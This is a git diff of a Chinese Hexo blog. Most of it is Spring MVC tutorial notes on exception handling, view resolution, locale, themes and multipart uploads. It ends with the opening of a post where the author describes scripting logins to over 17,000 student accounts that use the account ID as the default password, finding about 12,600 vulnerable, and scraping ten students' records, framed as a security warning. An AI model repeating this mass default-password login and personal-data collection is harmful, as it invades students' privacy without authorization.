+<h1 id="7-异常处理"><a href="#7-异常处理" class="headerlink" title="7. 异常处理"></a>7. 异常处理</h1><p>在映射或调用请求处理程序 （例如带有 @Controller 注解的控制器） 处理请求时，如果抛出了异常，则 DispatcherServlet 调用 HandlerExceptionResolver bean 来处理异常，然后将错误页面或错误状态码等信息返回个客户端。</p>
+<p>下面列出 HandlerExceptionResolver 的几个实现类：</p>
+<p><em>HandlerExceptionResolver 实现类</em></p>
+<table>
+<thead>
+<tr>
+<th>类名</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td> SimpleMappingExceptionResolver</td>
+<td>将异常类型映射到异常页面的视图名，可以很容易实现错误页面的返回</td>
+</tr>
+<tr>
+<td> DefaultHandlerExceptionResolver</td>
+<td>处理由 Spring MVC 抛出的异常，可以直接映射到不同的 HTTP 状态码</td>
+</tr>
+<tr>
+<td> ResponseStatusExceptionResolver</td>
+<td>处理带有 @ResponseStatus 注解的异常，并将其映射到 HTTP 状态码</td>
+</tr>
+<tr>
+<td> ExceptionHandlerExceptionResolver</td>
+<td>通过调用控制器（带有 @Controller 注解或 @ControllerAdvice 注解）中的带有 @ExceptionHandler 注解的方法，来处理异常</td>
+</tr>
+</tbody>
+</table>
+<p>如果需要同时映射多个异常类型，需要设置不同异常的权重 （order 属性），权重越高，处理时机越晚。</p>
+<h2 id="处理方式"><a href="#处理方式" class="headerlink" title="处理方式"></a>处理方式</h2><p>HandlerExceptionResolver 中可以返回：</p>
+<ul>
+<li>ModelAndView： 指向视图名</li>
+<li>不带属性的 ModelAndView： 如果已经通过权重更低的方法处理过异常了</li>
+<li>null： 这个异常无法被当前异常处理器识别，需要丢给接下来的处理器，如果所有处理器都不能处理这个异常，异常会传到 Servlet 容器中，由容器来处理</li>
+<li>自定义异常处理请求也非常简单，比如，在 xml 中配置一个 HandlerExceptionResolver 的 bean， Spring MVC 会自动使用内部的默认异常处理器来处理 Spring MVC 抛出的异常（带有 @ResponseStatus 注解的异常或带有 @ExceptionHandler 注解的方法），可以修改这些默认配置或干脆直接重写新的配置。</li>
+</ul>
+<h2 id="Servlet-容器中定义的错误页面-error-page"><a href="#Servlet-容器中定义的错误页面-error-page" class="headerlink" title="Servlet 容器中定义的错误页面 (error-page)"></a>Servlet 容器中定义的错误页面 (error-page)</h2><p>如果抛出的异常没能被任何 HandlerExceptionResolver 处理，就会传到 Servlet 容器中。如果将 HTTP 响应码设置为 4xx 或 5xx， Servlet 容器会直接返回默认的错误页面。可以在 web.xml 中配置自定义的错误页面：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">error-page</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">location</span>&gt;</span>/error<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>此时，如果想要对异常处理进一步自定义，可以这样做：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ErrorController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(path = <span class="string">"/error"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Map&lt;String, Object&gt; <span class="title">handle</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        Map&lt;String, Object&gt; map = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">        map.put(<span class="string">"status"</span>, request.getAttribute(<span class="string">"javax.servlet.error.status_code"</span>));</span><br><span class="line">        map.put(<span class="string">"reason"</span>, request.getAttribute(<span class="string">"javax.servlet.error.message"</span>));</span><br><span class="line">        <span class="keyword">return</span> map;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这样就能再次将 /error 请求交给 DispatcherServlet 来处理，这种方式解决了使用 RestController 返回 JSON，而不是返回视图的情况。</p>
+<h1 id="8-视图名解析"><a href="#8-视图名解析" class="headerlink" title="8. 视图名解析"></a>8. 视图名解析</h1><p>Spring MVC 定义了 View 和 ViewResolver 这两个接口，View 负责返回视图前的数据准备， ViewResolver 则负责将逻辑视图名映射到实际视图。 屏蔽了具体的视图实现细节。</p>
+<p><em>ViewResolver 的几个实现类</em><br>类名  |  功能<br>–|–<br> AbstractCachingViewResolver |  AbstractCachingViewResolver 的实现类会将解析过的视图缓存，缓存可以提升特定视图技术的性能。可以通过设置 cache 属性的值为 false 来将缓存功能关闭。如果想在运行时刷新视图缓存，可以调用 removeFromCache(String viewName, Locale loc) 方法将已缓存内容移除。<br> XmlViewResolver |  可以使用 Spring bean DTD 定义，在 xml 中对其配置。默认的配置文件为 /WEB-INF/views.xml<br> ResourceBundleViewResolver |  通过解析定义的 ResourceBundle bean，将 viewname 解析为视图名，url 解析为视图路径<br> UrlBasedViewResolver |  可以直接将 url 映射到返回值中，无需再进行额外的映射配置，适用于视图结构清晰，可以直接对应匹配的情况<br> InternalResourceViewResolver |  UrlBasedViewResolver 的子类，可以解析 InternalResourceView （比如 Servlet 或 JSP) 以及其子类，比如 JstlView 或 TilesView。可以通过 setViewClass(..) 方法来指定要解析的具体视图类型<br> FreeMarkerViewResolver |  UrlBasedViewResolver 的子类，可以解析 FreeMarkerView 以及自定义的子类<br> ContentNegotiatingViewResolver |  通过请求的 url 或请求头信息来解析视图</p>
+<h2 id="处理方式-1"><a href="#处理方式-1" class="headerlink" title="处理方式"></a>处理方式</h2><p>和上面提到的异常解析器一样，通过配置 bean 来解析视图，同样可以指定不同解析器的权重，权重越高，调用时机越晚。</p>
+<p>ViewResolver 可以通过返回 null 来表示视图无法解析，如果是 JSP 或 InternalResourceViewResolver，可以判断 JSP 是否存在的唯一方法就是通过执行 RequestDispatcher 的请求调度方法。 因此必须将 InternalResourceViewResolver 的权重配置为所有视图解析器中最高的。</p>
+<p>如果返回视图的执行过程不需要处理任何的业务逻辑，可以使用视图控制器来实现：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableWebMvc</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WebConfig</span> <span class="keyword">implements</span> <span class="title">WebMvcConfigurer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addViewControllers</span><span class="params">(ViewControllerRegistry registry)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 将 url 为 "/" 的请求映射到名为 home 的视图上</span></span><br><span class="line">        registry.addViewController(<span class="string">"/"</span>).setViewName(<span class="string">"index"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在 xml 中这样写：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mvc:view-controller</span> <span class="attr">path</span>=<span class="string">"/"</span> <span class="attr">view-name</span>=<span class="string">"index"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><p>如果返回的视图名以 “redirect:” 开头， UrlBasedViewResolver 就会将其解析为请求重定向，后面的视图名就是将重定向的 url。</p>
+<p>这样和返回 RedirectView 的效果是一样的，他可以将请求重定向到当前 Servlet 上下文的相对路径，如果写成这样 <code>redirect:http://myhost.com/some/arbitrary/path</code>，就会重定向到这个绝对路径上。</p>
+<p>如果在控制器的方法上写了 @ResponseStatus 注解，则注解中的状态码优先权高于 RedirectView 中的。</p>
+<h2 id="转发"><a href="#转发" class="headerlink" title="转发"></a>转发</h2><p>如果最终的视图解析器为 UrlBasedViewResolver， 则可以使用 <code>forward:</code>，效果通过 forward() 方法创建一个 InternalResourceView 。这个前缀不适用于 InternalResourceViewResolver 和 InternalResourceView （JSP），但对于使用其他的视图技术且想执行请求转发，就非常有用了。同样，将多个视图解析器组成处理链实现链式处理。</p>
+<h2 id="内容规约"><a href="#内容规约" class="headerlink" title="内容规约"></a>内容规约</h2><p>ContentNegotiatingViewResolver 实际并不会解析视图，而是调用其他视图解析器，查找与客户端请求中有关信息匹配的视图。这些信息可以从请求头中的 <code>Accept</code> 中或 url 中参数获得。</p>
+<p>ContentNegotiatingViewResolver 将请求的媒体类型与 ViewResolvers 关联的 View 支持的媒体类型（也称为 Content-Type）进行比较，选择最佳的 View 来处理请求。 与这个 Content-Type 相符的第一个视图会被首先返回给客户端。 如果 ViewResolver 链无法解析视图，则会在 DefaultViews 的视图列表进行查找。 后者适用于无需进行业务逻辑处理的单例 View ，因此不用考虑逻辑视图名。 Accept 头中可以包含通配符，例如 <code>text/ *</code> ，则将匹配 content-type 为 <code>text/xml</code>的 View 。</p>
+<h1 id="9-语言环境"><a href="#9-语言环境" class="headerlink" title="9. 语言环境"></a>9. 语言环境</h1><p>Spring MVC 和 Spring 中的大多数模块一样，也提供了内容国际化的功能。DispatcherServlet 可以根据客户端的语言环境进行内容的自动国际化，这要归功于 LocaleResolver。</p>
+<p>DispatcherServlet 接受到请求后会去上下文中查找 LocaleResolver bean，找到后就会使用它完成国际化的任务。可以调用 RequestContext.getLocale() 来获得请求的语言环境。</p>
+<p>如果不想使用默认的自动解析方式，还可以通过在处理程序映射中添加一个拦截器来实现，比如解析 url 中的参数。</p>
+<p>有关国际化的解析器和拦截器都定义在 <code>org.springframework.web.servlet.i18n</code> 中，并且都需要在应用上下文中配置。Spring 可以国际化这些内容：</p>
+<h2 id="时区"><a href="#时区" class="headerlink" title="时区"></a>时区</h2><p>除了语言环境，有时还需要获得客户端的时区信息，LocaleContextResolver 对 LocaleResolver 中的功能进行了扩展，这样可以在 LocaleContext 中获得更为丰富的信息。</p>
+<p>通过 RequestContext.getTimeZone()方法获取客户端的时区信息，在 Spring 的 ConversionService 中注册的日期/时间转换器和格式化器会自动获取这些信息。</p>
+<h2 id="请求头"><a href="#请求头" class="headerlink" title="请求头"></a>请求头</h2><p>这个区域解析器会识别请求中的 <code>accept-language</code> 头，这个字段一般包含客户操作系统的区域信息，但是它无法获得客户端的时区信息。</p>
+<h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p>这个区域解析器会检查客户端上的 Cookie 是否存在语言或时区信息。这个区域解析器可以设置 cookie 的名字和失效时间。在 xml 文件中定义 CookieLocaleResolver：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"localeResolver"</span> <span class="attr">class</span>=<span class="string">"org.springframework.web.servlet.i18n.CookieLocaleResolver"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 根据具体情况自定义 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"cookieName"</span> <span class="attr">value</span>=<span class="string">"clientlanguage"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 100000 为秒数，值为 -1 时, cookie 会在浏览器关闭时被销毁 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"cookieMaxAge"</span> <span class="attr">value</span>=<span class="string">"100000"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><em>CookieLocaleResolver 部分属性的含义</em></p>
+<table>
+<thead>
+<tr>
+<th>属性</th>
+<th>默认值</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td> cookieName</td>
+<td>类名+语言环境</td>
+<td>cookie 的名称</td>
+</tr>
+<tr>
+<td> cookieMaxAge</td>
+<td>Servlet 容器中规定的值</td>
+<td>cookie 的有效期，值为 -1 时, cookie 会在浏览器关闭时被销毁</td>
+</tr>
+<tr>
+<td> cookiePath</td>
+<td>/</td>
+<td>将 cookie 的作用域限制到制定的相对路径下，cookie 将只在这个路径及其自路径中有效</td>
+</tr>
+</tbody>
+</table>
+<h2 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h2><p>SessionLocaleResolver 可以从会话上下文中获取语言和时区信息，它和 CookieLocaleResolver 的区别是：它是在 Servlet 容器的 session 中存储语言和时区信息，所有，这些信息都是暂时的，会话结束后也就不复存在了。</p>
+<h2 id="语言环境拦截器"><a href="#语言环境拦截器" class="headerlink" title="语言环境拦截器"></a>语言环境拦截器</h2><p>LocaleChangeInterceptor bean 可以通过自定义配置来修改请求中的参数，达到修改语言环境的目的。调用 LocaleResolver 中的 setLocal() 方法即可。下面的例子演示将所有请求中的 siteLanguage 参数修改为荷兰语：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"localeChangeInterceptor"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">class</span>=<span class="string">"org.springframework.web.servlet.i18n.LocaleChangeInterceptor"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"paramName"</span> <span class="attr">value</span>=<span class="string">"siteLanguage"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"localeResolver"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">class</span>=<span class="string">"org.springframework.web.servlet.i18n.CookieLocaleResolver"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"urlMapping"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">class</span>=<span class="string">"org.springframework.web.servlet.handler.SimpleUrlHandlerMapping"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"interceptors"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ref</span> <span class="attr">bean</span>=<span class="string">"localeChangeInterceptor"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"mappings"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>/**/*.view=someController<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h1 id="10-主题"><a href="#10-主题" class="headerlink" title="10. 主题"></a>10. 主题</h1><p>Spring Web MVC 框架支持自定义主题，应用程序的整体外观可以实现统一修改。主题即静态资源的集合，通常是 CSS 和图片，两者决定了应用的整体风格。</p>
+<h2 id="主题的定义"><a href="#主题的定义" class="headerlink" title="主题的定义"></a>主题的定义</h2><p>必须定义一个 <code>org.springframework.ui.context.ThemeSource</code> 接口的实现类才能使用主题功能。默认情况下，WebApplicationContext 通过 <code>org.springframework.ui.context.support.ResourceBundleThemeSource</code> 实现主题功能，它从 classpath 的根目录读取配置文件。 要使用自定义的 ThemeSource，需要配置 ResourceBundleThemeSource 的主题名称前缀，在应用程序上下文中注册一个 themeSource bean。</p>
+<p>使用 ResourceBundleThemeSource 自定义主题，需要将配置写在 properties 文件中，这个文件中包含了构成主题的所有资源。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">styleSheet=/themes/cool/style.css</span><br><span class="line">background=/themes/cool/img/coolBg.jpg</span><br></pre></td></tr></table></figure>
+<p>在 JSP 中使用主题设置，要用到 <code>spring:theme</code> 标签：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">taglib</span> <span class="attr">prefix</span>=<span class="string">"spring"</span> <span class="attr">uri</span>=<span class="string">"http://www.springframework.org/tags"</span>%&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"&lt;spring:theme code='styleSheet'/&gt;"</span> <span class="attr">type</span>=<span class="string">"text/css"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span> <span class="attr">style</span>=<span class="string">"background=&lt;spring:theme code='background'/&gt;"</span>&gt;</span></span><br><span class="line">        ...</span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>默认情况下，ResourceBundleThemeSource 主题名前缀是空的。properties 文件是从 classpath 的根目录读取的。所以应当将 abc.properties 配置文件放到根目录下（<code>/WEB-INF/classes</code>）。 ResourceBundleThemeSource 可以实现主题的国际化。比如，<code>/WEB-INF/classes/abc_nl.properties</code>，结合上面对 background 属性的配置，可以实现将背景切换为带有荷兰文字的背景图片。</p>
+<h2 id="主题的解析"><a href="#主题的解析" class="headerlink" title="主题的解析"></a>主题的解析</h2><p>定义好主题配置后，当有请求发来时，在预处理阶段，通过查找上下文中叫 <code>themeResolver</code> 的 bean 来对决定用什么解析器来解析主题，这里的工作原理和上文中的 <code>localeResolver</code> 一样。通过识别带有不同参数的请求来对请求的主题进行切换。Spring 提供了这几种 themeResolver:</p>
+<table>
+<thead>
+<tr>
+<th>类名</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td> FixedThemeResolver</td>
+<td>通过读取 <code>defaultThemeName</code> 属性来选择固定的主题</td>
+</tr>
+<tr>
+<td> SessionThemeResolver</td>
+<td>主题信息由 session 保存，每个 session 只需解析一次，不同的 session 之间无法共享</td>
+</tr>
+<tr>
+<td> FixedThemeResolver</td>
+<td>主题信息保存在客户端的 cookie 中</td>
+</tr>
+</tbody>
+</table>
+<p>Spring 还提供了一个 <code>ThemeChangeInterceptor</code> 拦截器，通过识别请求的参数来切换主题。</p>
+<h1 id="11-Multipart"><a href="#11-Multipart" class="headerlink" title="11. Multipart"></a>11. Multipart</h1><p><code>org.springframework.web.multipart.MultipartResolver</code> 提供了一种处理表单上传文件的解决方案，有两种实现方式，一种是基于 Apache 的 Commons-Fileupload，另一种是基于 Servlet 3.0 的。</p>
+<p>首先要在 Spring 的配置文件中为 DispatcherServlet 声明一个叫做 <code>MultipartResolver</code> 的 bean，DispatcherServlet 会自动识别并调用它来处理文件上传请求。它会将 content-type 为 <code>multipart/form-data</code> 的请求包装成 <code>MultipartHttpServletRequest</code>，从而将这些 “part” 暴露为请求的一个参数。</p>
+<h2 id="Apache-FileUpload"><a href="#Apache-FileUpload" class="headerlink" title="Apache FileUpload"></a>Apache FileUpload</h2><p>要想使用 Apache Commons-Fileupload，需要将 <code>multipartResolver</code> bean 配置为 <code>CommonsMultipartResolver</code>，另外不要忘了添加 <code>commons-fileupload</code> 的依赖。</p>
+<h2 id="Servlet-3-0"><a href="#Servlet-3-0" class="headerlink" title="Servlet 3.0"></a>Servlet 3.0</h2><p>如果通过 Servlet 3.0 处理 multipart 请求，则同样需要在 DispatcherServlet 中注册。在 Java 代码中配置的话，需要添加一个 <code>MultipartConfigElement</code>；在 xml 文件中配置的话，添加 <code>&lt;multipart-config&gt;</code> 节点。文件大小限制和文件保存位置等选项同样需要这样配置，因为在 Servlet 3.0 以后，不允许 <code>MultipartResolver</code> 这么干了。</p>
+<p>Servlet 3.0 配置好后，只需要在 xml 文件中将 <code>multipartResolver</code> hean 配置为 <code>StandartMultipartResolver</code> 即可。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="/2018/02/24/2018-02-24-Python 第一个爬虫-教务系统信息收集/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="摆码王子">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="James' Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/02/24/2018-02-24-Python 第一个爬虫-教务系统信息收集/" itemprop="url">Python 第一个爬虫-教务系统信息收集</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-24T09:25:00+08:00">
+                2018-02-24
               </time>
             
 
@@ -401,15 +769,982 @@
       
         
           
-            <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+            <h2 id="初衷"><a href="#初衷" class="headerlink" title="初衷"></a>初衷</h2><p><strong>本文旨在提醒同学们及时修改密码，增强保护个人隐私的意识，因此代码中一些关键数据以及校名等信息不会公开！复制粘贴文章中的代码不会爬到任何东西。只是作为学习 Python 爬虫的一点总结而已！</strong></p>
+<p>作者所在学校的教务系统安全防范措施可谓非常不严密，学生登录甚至不需要图形验证码。每年学生入学之后，学校下发的账号，初始密码不是无规律的，而是和账号完全一致！如果学生不及时修改密码，那么其他人可以轻松登录他的账号。登录后可以看到学生的学籍信息，包括高考报名时照片，家长联系方式等，联系地址甚至详细到几单元几楼几号门，<strong>个人信息泄露情况非常严重！</strong></p>
+<h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p>先说结果。经过两天连写带调试，终于完成了对全校本科生 17400 多个在网账号的测试，其中有 12600 多个账号使用的还是初始密码。此处隐去校名，统计结果如下：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">序号</th>
+<th style="text-align:center">学院</th>
+<th style="text-align:center">年级</th>
+<th style="text-align:center">在网账号</th>
+<th style="text-align:center">可爬账号</th>
+<th style="text-align:center">年级占比</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">1</td>
+<td style="text-align:center">本一</td>
+<td style="text-align:center">2014</td>
+<td style="text-align:center">3157</td>
+<td style="text-align:center">1998</td>
+<td style="text-align:center">63.29%</td>
+</tr>
+<tr>
+<td style="text-align:center">2</td>
+<td style="text-align:center">本一</td>
+<td style="text-align:center">2015</td>
+<td style="text-align:center">3328</td>
+<td style="text-align:center">2234</td>
+<td style="text-align:center">67.13%</td>
+</tr>
+<tr>
+<td style="text-align:center">3</td>
+<td style="text-align:center">本一</td>
+<td style="text-align:center">2016</td>
+<td style="text-align:center">3641</td>
+<td style="text-align:center">3066</td>
+<td style="text-align:center">84.21%</td>
+</tr>
+<tr>
+<td style="text-align:center">4</td>
+<td style="text-align:center">本一</td>
+<td style="text-align:center">2017</td>
+<td style="text-align:center">3497</td>
+<td style="text-align:center">3326</td>
+<td style="text-align:center">95.11%</td>
+</tr>
+<tr>
+<td style="text-align:center">5</td>
+<td style="text-align:center">本三</td>
+<td style="text-align:center">2014</td>
+<td style="text-align:center">1759</td>
+<td style="text-align:center">303</td>
+<td style="text-align:center">17.23%</td>
+</tr>
+<tr>
+<td style="text-align:center">6</td>
+<td style="text-align:center">本三</td>
+<td style="text-align:center">2015</td>
+<td style="text-align:center">1643</td>
+<td style="text-align:center">620</td>
+<td style="text-align:center">37.74%</td>
+</tr>
+<tr>
+<td style="text-align:center">7</td>
+<td style="text-align:center">本三</td>
+<td style="text-align:center">2016</td>
+<td style="text-align:center">1605</td>
+<td style="text-align:center">1434</td>
+<td style="text-align:center">89.35%</td>
+</tr>
+<tr>
+<td style="text-align:center">8</td>
+<td style="text-align:center">本三</td>
+<td style="text-align:center">2017</td>
+<td style="text-align:center">1552</td>
+<td style="text-align:center">639</td>
+<td style="text-align:center">41.17%</td>
+</tr>
+</tbody>
+</table>
+<p><strong>介于初衷，只爬了 10 个账号的信息，以示严重性！</strong></p>
+<p><img src="http://upload-images.jianshu.io/upload_images/7134080-ec8c310143b69f21.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="爬到的学籍信息"></p>
+<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>本人之前做过近 2 年的 Java 相关开发，对 HTTP 协议中常用的知识了解一些，再加上 Python 出了名的简洁易用，因此入门还是比较轻松的。去年有一段时间研究过一阵子 Python，使用的是 Scrapy 框架，所以这一次我也首先想到了 Scrapy。</p>
+<p>Scrapy 这种框架适用的情形是：已经获取了需要爬取的页面的一系列 URL ，或者 URL 是成一定规律变化的，不需要登录或者登录一次拿到 Cookie 就可以拿着这个 Cookie 一直用了。但是教务系统完全相反，它需要每次都进行登录，也许 Scrapy 有办法，但也不会太简单，索性自己写。</p>
+<p>这套教务系统虽然安全性不怎么样，但也已是一套成熟的产品了，功能和稳定性上还是很不错的。</p>
